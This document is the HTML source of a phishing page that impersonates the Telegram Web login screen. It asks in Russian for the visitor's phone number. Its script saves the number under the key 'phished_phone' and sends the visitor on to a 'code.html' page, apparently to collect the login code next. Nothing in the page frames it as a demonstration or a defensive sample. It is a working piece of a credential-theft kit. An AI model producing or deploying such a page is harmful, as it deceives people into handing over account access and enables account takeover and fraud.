<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <link rel="icon" href="icon.jpg" type="image/jpeg">
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0088cc, #00a2e8);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 12px;
            width: 320px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            margin: 20px;
        }
        .header {
            background: #0088cc;
            padding: 20px;
            text-align: center;
            color: white;
        }
        .header h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
            margin-top: 0;
        }
        .header p {
            margin: 0;
            opacity: 0.9;
        }
        .form-section {
            padding: 30px 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 15px;
            text-align: center;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 500;
        }
        button:hover {
            background: #0077b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="icon.jpg" style="width: 40px; height: 40px; margin-bottom: 10px; border-radius: 8px;">
            <h1>Telegram</h1>
            <p>Введите ваш номер телефона</p>
        </div>
        
        <div class="form-section">
            <form id="phoneForm">
                <input type="tel" id="phone" placeholder="Номер телефона" required>
                <button type="submit">Далее</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('phoneForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            localStorage.setItem('phished_phone', phone);
            window.location.href = 'code.html';
        });
    </script>
</body>
</html>
